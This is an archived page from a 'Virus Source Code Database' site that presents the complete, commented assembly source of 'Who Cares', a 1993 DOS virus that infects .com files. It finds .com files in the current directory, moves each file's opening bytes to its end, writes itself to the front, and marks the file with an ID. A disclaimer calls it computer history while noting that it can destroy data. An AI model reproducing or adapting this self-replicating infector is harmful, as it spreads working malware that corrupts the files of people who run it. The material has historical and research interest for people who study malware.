<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: whocares_asm</title>
<meta name="KEYWORDS" content="whocares.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for whocares.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="w13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_507_asm.php">w13_507_asm</a><br>
<a href="w13_534__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534__asm.php">w13_534__asm</a><br>
<a href="w13_534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534_asm.php">w13_534_asm</a><br>
<a href="w13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_asm.php">w13_asm</a><br>
<a href="walkabr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/walkabr_asm.php">walkabr_asm</a><br>
<a href="wanderer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wanderer_asm.php">wanderer_asm</a><br>
<a href="warzd00d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/warzd00d_asm.php">warzd00d_asm</a><br>
<a href="whale1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale1_asm.php">whale1_asm</a><br>
<a href="whale2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale2_asm.php">whale2_asm</a><br>
<a href="whale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale_asm.php">whale_asm</a><br>
<a href="wharps_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wharps_asm.php">wharps_asm</a><br>
<a href="whocares_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whocares_asm.php">whocares_asm</a><br>
<a href="why_win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why_win_asm.php">why_win_asm</a><br>
<a href="why-win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why-win_asm.php">why-win_asm</a><br>
<a href="wildthg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthg2_asm.php">wildthg2_asm</a><br>
<a href="wildthng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthng_asm.php">wildthng_asm</a><br>
<a href="wonder_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wonder_c.php">wonder_c</a><br>
<a href="wvir14a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14a_asm.php">wvir14a_asm</a><br>
<a href="wvir14_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14_asm.php">wvir14_asm</a><br>
<a href="ww_217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww_217_asm.php">ww_217_asm</a><br>
<a href="ww-217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww-217_asm.php">ww-217_asm</a><br>
<a href="ww217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww217_asm.php">ww217_asm</a><br>
<a href="wwt_01_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_01_asm.php">wwt_01_asm</a><br>
<a href="wwt_02_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_02_asm.php">wwt_02_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;****************************************************************************
;  (c) Admiral Bailey and YAM.
;  Name: Who Cares                      Effective Length: 181 bytes
;  By Admiral Bailey - Youths Aganst McAfee '93
;  Notes:
;         While messing around trying to think up new ideas I came across
;  this idea. I different way of infecting. I looked up in VSUM and saw
;  another virus that infected this way. Forgot the name but it's something
;  different. It infects its files by moving the beginning and placing it at
;  the end. It then writes itself to the beginning. In someways its easier
;  but if your use to the other way this can get confusing. But its something
;  different. Check out the code below. I commented it all.
;****************************************************************************

        .model tiny
        .code
        org     100h                            ; All .COM files start here

ID = 'AB'                                       ; Id for infected files

Start:
        db     0e9h,2,0                         ; jmp after ID
        dw     id                               ; stick ID here.

        db      0bdh                            ; move bp,oooo
fileend dw      offset heap                     ; ending of file

DirLoop:

; NOTE: You really should move the dta here or else any command line
; parameter will not work.

        mov     dx,offset comfilespec           ; Files to look for
        call    findfirst                       ; no get all the files

        mov     si,bp                           ; move end of file into si
        sub     si,eof-start                    ; subtract the filesize
                                                ; and you now have the
                                                ; old beginning location
        mov     di,100h                         ; we put it back at the
                                                ; beginning
        push    di                              ; save on stack for return

        mov     cx,eof-start                    ; number of bytes to move

; Now here we put this part in the heap because when moving the bytes back
; it will get overwriten.

        mov     byte ptr [bp],0f3h              ; rep
        mov     byte ptr [bp+1],0a4h            ; movsb
        mov     byte ptr [bp+2],0c3h            ; ret

        jmp     bp                              ; jump to the end of the file

FindFirst:
        mov     ah,4eh                          ; Find first file
        xor     cx,cx                           ; only normal attributes

FindNext:
        int     21h                             ; Find first/next file int
        jc      quit                            ; none found so quit

        call    infection                       ; infect the file found

FindNext2:
        mov     ah,4fh                          ; Find next file
        jmp     findnext                        ; Jump to the loop

Quit:
        ret

Infection:
        mov     ax,3d00h                        ; Open file for read only
        call    open

        mov     ah,3fh                          ; Read from file
        mov     cx,5                            ; 5 bytes
        mov     dx,bp                           ; store in heap
        int     21h

        mov     ah,3eh                          ; Close file
        int     21h

        cmp     ax,(eof-start)+100              ; Is the file too small?
        jb      quit_infect                     ; file to small so get another

        cmp     word ptr [bp+3],id              ; Check for ID
        je      quit_infect

        mov     bx,80h                          ; location of DTA
        mov     dx,word ptr [bx+1ah]            ; Get file size from DTA
        add     dx,eof-start                    ; add virus size
        add     dx,100h                         ; add 100h to fix up
        mov     [fileend],dx                    ; save for new bp

        mov     al,2                            ; open file read/write
        call    open

        mov     ah,3fh                          ; Read from file
        mov     cx,eof-start                    ; Number of bytes
        mov     dx,bp                           ; store in heap
        int     21h

        mov     al,00                           ; Move Fpointer to beginning
        Call    move_fp

        mov     ah,40h                          ; write the virus to the
        mov     cx,eof-start                    ; beginning of the file
        mov     dx,100h                         ; starting
        int     21h

        mov     al,02                           ; move fpointer to end
        call    move_fp

        mov     ah,40h                          ; Write beginning of file to
        mov     cx,eof-start                    ; end
        mov     dx,bp                           ; heap has beginning
        int     21h

        mov     ah,3eh                          ; Close file
        int     21h

quit_infect:

        retn

Move_Fp:
        mov     ah,42h                          ; Move file pointer
        xor     cx,cx                           ; Al has location
        xor     dx,dx                           ; Clear these
        int     21h
        retn

Open:
        mov     ah,3dh                          ; open file
        mov     bx,80h                          ; location of DTA
        lea     dx,[bx+30]                      ; Filename in DTA
        int     21h
        xchg    ax,bx                           ; put file handle in bx
        ret

comfilespec db  '*.com',0                       ; Holds type of file to look fo

EOF     equ     $                               ; Marks the end of file

buffer      db  0cdh,020h,0,0,0                 ; original file goes here
            db  eof-start-5 dup (0)

heap    equ     $

        end     start



</textarea></td></tr></table></body></html>
